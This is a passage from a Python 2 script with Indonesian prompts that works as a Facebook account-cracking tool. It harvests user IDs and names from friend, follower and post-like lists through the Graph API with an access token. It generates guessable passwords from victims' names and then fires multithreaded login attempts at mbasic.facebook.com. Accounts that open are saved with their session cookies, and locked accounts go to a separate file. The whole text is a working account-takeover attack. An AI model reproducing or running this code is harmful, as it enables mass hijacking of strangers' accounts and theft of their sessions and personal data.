            print '\r\x1b[1;97m [*] Sedang proses dump\x1b[1;92m %s  ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        jalan('\n\x1b[1;92m [✓] Succes dump id ')
        print '\x1b[1;97m [!] File tersimpan : \x1b[1;92m%s ' % qq
        print 48 * '\x1b[1;97m═'
        raw_input(' Tekan Enter ')
        romi_ganz()
    except Exception as e:
        exit('\n \x1b[1;91m[!] Dump Gagal')


def followers():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m [!] Sudah invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        idt = raw_input('\n\x1b[1;97m [?] Id Followers : ')
        ih = raw_input(' \x1b[1;97m[?] Nama File : ')
        asw = raw_input(' \x1b[1;97m[?] Limit : ')
        pok = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=' + asw + '&access_token=' + toket)
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + ih + '.txt').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r\x1b[1;97m [*] Sedang proses dump \x1b[1;92m%s  ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        jalan('\n\x1b[1;92m [✓] Succes dump followers ')
        print '\x1b[1;97m [!] File tersimpan : \x1b[1;92m%s ' % ah
        print 48 * '\x1b[1;97m═'
        raw_input(' Tekan Enter ')
        romi_ganz()
    except Exception as e:
        exit('\n \x1b[1;91m[!] Dump Gagal')


def postingan():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m [!] Sudah invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        idt = raw_input('\n \x1b[1;97m[?] Id Post : ')
        ih = raw_input('\x1b[1;97m [?] Nama File : ')
        asw = raw_input('\x1b[1;97m [?] Limit : ')
        kon = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=' + asw + '&access_token=' + toket)
        id = []
        x = json.loads(kon.text)
        ikeh = ('dump/' + ih + '.txt').replace(' ', '_')
        ys = open(ikeh, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r\x1b[1;97m [*] Sedang proses dump\x1b[1;92m %s  ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        jalan('\n\x1b[1;92m [✓] Succes dump post ')
        print '\x1b[1;97m [!] File tersimpan : \x1b[1;92m%s ' % ikeh
        print 48 * '\x1b[1;97m═'
        raw_input(' Tekan Enter ')
        romi_ganz()
    except Exception as e:
        exit('\n \x1b[1;91m[!] Dump Gagal')


def graph_fb(em, pas, hosts):
    global mbasic_h
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
       '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}
            return

        return


def mbasic(em, pas, hosts):
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
       '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}
            return

        return


def local(em, pas, hosts):
    r = requests.Session()
    r.headers.update(local_h)
    p = r.get('https://graph.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
       '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}
            return

        return


def generate(text):
    global ips
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                results.append(i)
                if 'indonesia' in ips:
                    results.append('sayang')
                    results.append('anjing')

    return results


def pilih():
    m = raw_input('\x1b[1;97m [?] >\x1b[1;97m ')
    if m == '':
        print '\x1b[1;91m [!] Isi yang benar'
        time.sleep(1)
        os.system('clear')
        masuk()
    elif m == '2':
        cookie()
    elif m == '1':
        token()
    elif m == '3':
        tutor_token()
    elif m == '4':
        tutor_kueh()
    elif m == '0':
        os.sys.exit()
    else:
        print '\x1b[1;91m [!] Isi yang benar'
        time.sleep(1)
        os.system('clear')
        masuk()


def tutor_token():
    os.system('clear')
    print logo2
    print 48 * '\x1b[1;97m═'
    jalan(' \x1b[1;32mAnda Akan Di Arahkan Ke Youtube ')
    jalan(' \x1b[1;32mJgn Lupa Subrek ya :)')
    os.system('xdg-open https://youtu.be/IG5QfdxRkeY')
    romi_ganz()


def tutor_kueh():
    os.system('clear')
    print logo2
    print 48 * '\x1b[1;97m═'
    jalan(' \x1b[1;32mAnda Akan Di Arahkan Ke Youtube ')
    jalan(' \x1b[1;32mJgn Lupa Subrek ya :)')
    os.system('xdg-open https://youtu.be/b9crrvr6d2s')
    romi_ganz()


class crack():

    def __init__(self):
        self.ada = []
        self.cp = []
        self.ko = 0
        while True:
            f = raw_input(' \x1b[1;97m[?] password manual/default? [m/d] : ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = raw_input(' \x1b[1;97m[?] File dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ' \x1b[1;91m[!] File dump tidak ada'
                            time.sleep(3)
                            romi_ganz()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print ' \x1b[1;91m[!] File dump tidak ada'
                    time.sleep(3)
                    romi_ganz()

                print '\n \x1b[1;97m[*] Gunakan tanda (\x1b[1;92m,\x1b[1;97m) untuk pemisah'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = raw_input(' \x1b[1;97m[?] File dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ' \x1b[1;91m[!] File dump tidak ada'
                            time.sleep(3)
                            romi_ganz()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print ' \x1b[1;91m[!] File dump tidak ada'
                    time.sleep(3)
                    romi_ganz()

                print ' \x1b[1;97m[?] Total id : %s' % len(self.fl)
                print 48 * '\x1b[1;97m═'
                jalan('    • Sedang dalam proses, mohon bersabar • ')
                print 48 * '\x1b[1;97m═'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print ''
                print 48 * '\n\x1b[1;97m═'
                print '\x1b[1;92m Proses selesai...'
                print '\x1b[1;97m Salin hasil crack lalu simpan'
                print 48 * '\x1b[1;97m═'
                exit()

    def pwlist(self):
        self.pw = raw_input('\x1b[1;97m [?] Password : ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print ' \x1b[1;97m[+] Total id : %s ' % len(self.fl)
            print 48 * '\x1b[1;97m═'
            jalan('    • Sedang dalam proses, mohon bersabar • ')
            print 48 * '\x1b[1;97m═'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print ''
            print 48 * '\x1b[1;97m═'
            print '\x1b[1;92m Proses selesai...'
            print '\x1b[1;97m Salin hasil crack lalu simpan'
            print 48 * '\x1b[1;97m═'
            exit()


class crack_mob():

    def __init__(self):
        self.ada = []
        self.cp = []
        self.ko = 0
        while True:
            f = raw_input(' \x1b[1;97m[?] password manual/default? [m/d] : ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = raw_input(' \x1b[1;97m[?] File dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ' \x1b[1;91m[!] File dump tidak ada'
                            time.sleep(3)
                            romi_ganz()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print ' \x1b[1;91m[!] File dump tidak ada'
                    time.sleep(3)
                    romi_ganz()

                print '\n \x1b[1;97m[*] Gunakan tanda (\x1b[1;92m,\x1b[1;97m) untuk pemisah'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = raw_input(' \x1b[1;97m[?] File dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ' \x1b[1;91m[!] File dump tidak ada'
                            time.sleep(3)
                            romi_ganz()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print ' \x1b[1;91m[!] File dump tidak ada'
                    time.sleep(3)
                    romi_ganz()

                print ' \x1b[1;97m[?] Total id : %s' % len(self.fl)
                print 48 * '\x1b[1;97m═'
                jalan('    • Sedang dalam proses, mohon bersabar • ')
                print 48 * '\x1b[1;97m═'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print ''
                print 48 * '\n\x1b[1;97m═'
                print '\x1b[1;92m Proses selesai...'
                print '\x1b[1;97m Salin hasil crack lalu simpan'
                print 48 * '\x1b[1;97m═'
                exit()

    def pwlist(self):
        self.pw = raw_input('\x1b[1;97m [?] Password : ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print ' \x1b[1;97m[+] Total id : %s ' % len(self.fl)
            print 48 * '\x1b[1;97m═'
            jalan('    • Sedang dalam proses, mohon bersabar • ')
            print 48 * '\x1b[1;97m═'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print ''
            print 48 * '\x1b[1;97m═'
            print '\x1b[1;92m Proses selesai...'
            print '\x1b[1;97m Salin hasil crack lalu simpan'
            print 48 * '\x1b[1;97m═'
            exit()

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = login(fl.get('id'), i, 'https://m.facebook.com')
                if log.get('status') == 'success':
                    print '\r %s[Succesfull] %s ◊ %s      %s' % (H, fl.get('id'), i, N)
                    self.ada.append(' [Succesfull] %s ◊ %s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('ok-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [Succesfull] %s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = ' [Succesfull] %s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r %s[Checkpoint] %s ◊ %s      %s' % (K, fl.get('id'), i, N)
                    self.cp.append(' [Checkpoint] %s ◊ %s' % (fl.get('id'), i))
                    open('cp-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [Checkpoint] %s|%s\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r\x1b[1;95m • \x1b[1;97mCrack : %s/%s \x1b[1;92mOK:%s \x1b[1;97m- \x1b[1;93mCP:%s%s ' % (self.ko, len(self.fl), len(self.ada), len(self.cp), N),
            sys.stdout.flush()
        except:
            self.main(fl)


class crack1():

    def __init__(self):
        self.ada = []
        self.cp = []
        self.ko = 0
        while True:
            f = raw_input(' \x1b[1;97m[?] password manual/default? [m/d] : ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = raw_input(' \x1b[1;97m[?] File dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\x1b[1;91m [!] File dump tidak ada'
                            time.sleep(3)
                            romi_ganz()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print ' \x1b[1;91m[!] File dump tidak ada'
                    time.sleep(3)
                    romi_ganz()

                print '\n \x1b[1;97m[*] Gunakan tanda (\x1b[1;92m,\x1b[1;97m) untuk pemisah'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = raw_input(' \x1b[1;97m[?] File dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ' \x1b[1;91m[!] File dump tidak ada'
                            time.sleep(3)
                            romi_ganz()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '\x1b[1;91m [!] File dump tidak ada'
                    time.sleep(3)
                    romi_ganz()

                print '\x1b[1;97m [+] Total id : %s ' % len(self.fl)
                print 48 * '\x1b[1;97m═'
                jalan('    • Sedang dalam proses, mohon bersabar • ')
                print 48 * '\x1b[1;97m═'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print ''
                print 48 * '\x1b[1;97m═'
                print '\x1b[1;92m Proses selesai...'
                print '\x1b[1;97m Salin hasil crack lalu simpan'
                print 48 * '\x1b[1;97m═'
                exit()

    def pwlist(self):
        self.pw = raw_input('\x1b[1;97m [?] Password : ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[1;97m [+] Total id : %s ' % len(self.fl)
            print 48 * '\x1b[1;97m═'
            jalan('    • Sedang dalam proses, mohon bersabar • ')
            print 48 * '\x1b[1;97m═'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print ''
            print 48 * '\x1b[1;97m═'
            print '\x1b[1;92m Proses selesai...'
            print '\x1b[1;97m Salin hasil crack lalu simpan'
            print 48 * '\x1b[1;97m═'
            exit()

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://graph.facebook.com')
                if log.get('status') == 'success':
                    print '\r%s [Succesfull] %s ◊ %s      %s' % (H, fl.get('id'), i, N)
                    self.ada.append(' [Succesfull] %s ◊ %s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('ok-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [Succesfull] %s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = ' [Succesfull] %s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r %s[Checkpoint] %s ◊ %s      %s' % (K, fl.get('id'), i, N)
                    self.cp.append(' [Checkpoint] %s ◊ %s' % (fl.get('id'), i))
                    open('cp-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [Checkpoint] %s|%s\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r\x1b[1;95m • \x1b[1;97mCrack : %s/%s \x1b[1;92mOK:%s \x1b[1;97m- \x1b[1;93mCP:%s%s ' % (self.ko, len(self.fl), len(self.ada), len(self.cp), N),
            sys.stdout.flush()
        except:
            self.main(fl)


class crack3():

    def __init__(self):
        self.ada = []
        self.cp = []
        self.ko = 0
        while True:
            f = raw_input(' \x1b[1;97m[?] password manual/default? [m/d] : ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = raw_input(' \x1b[1;97m[?] File dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ' \x1b[1;91m[!] File dump tidak ada'
                            time.sleep(3)
                            romi_ganz()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print ' \x1b[1;91m[!] File dump tidak ada'
                    time.sleep(3)
                    romi_ganz()

                print '\n \x1b[1;97m[*] Gunakan tanda (\x1b[1;92m,\x1b[1;97m) untuk pemisah'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = raw_input(' \x1b[1;97m[?] File dump : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ' \x1b[1;91m[!] File dump tidak ada'
                            time.sleep(3)
                            romi_ganz()

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print ' \x1b[1;91m[!] File dump tidak ada'
                    time.sleep(3)
                    romi_ganz()

                print '\x1b[1;97m [+] Total id : %s ' % len(self.fl)
                print 48 * '\x1b[1;97m═'
                jalan('    • Sedang dalam proses, mohon bersabar • ')
                print 48 * '\x1b[1;97m═'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print ''
                print 48 * '\x1b[1;97m═'
                print '\x1b[1;92m Proses selesai...'
                print '\x1b[1;97m Salin hasil crack lalu simpan'
                print 48 * '\x1b[1;97m═'
                exit()

    def pwlist(self):
        self.pw = raw_input('\x1b[1;97m [?] Password : ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\x1b[1;97m [+] Total id : %s ' % len(self.fl)
            print 48 * '\x1b[1;97m═'
            jalan('    • Sedang dalam proses, mohon bersabar • ')
            print 48 * '\x1b[1;97m═'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print ''
            print 48 * '\x1b[1;97m═'
            print '\x1b[1;92m Proses selesai...'
            print '\x1b[1;97m Salin hasil crack lalu simpan'
            print 48 * '\x1b[1;97m═'
            exit()

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = local(fl.get('id'), i, 'localhost:5000')
                if log.get('status') == 'success':
                    print '\r %s[Succesfull] %s ◊ %s      %s' % (H, fl.get('id'), i, N)
                    self.ada.append(' [Succesfull] %s ◊ %s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('ok-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [Succesfull] %s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = ' [Succesfull] %s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r %s[Checkpoint] %s ◊ %s      %s' % (K, fl.get('id'), i, N)
                    self.cp.append(' [Checkpoint] %s ◊ %s' % (fl.get('id'), i))
                    open('cp-%s-%s-%s.txt' % (ha, op, ta), 'a').write(' [Checkpoint] %s|%s\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r\x1b[1;95m • \x1b[1;97mCrack : %s/%s \x1b[1;92mOK:%s \x1b[1;97m- \x1b[1;93mCP:%s%s ' % (self.ko, len(self.fl), len(self.ada), len(self.cp), N),
            sys.stdout.flush()
        except:
            self.main(fl)


if __name__ == '__main__':
    romi_ganz()
    masuk()
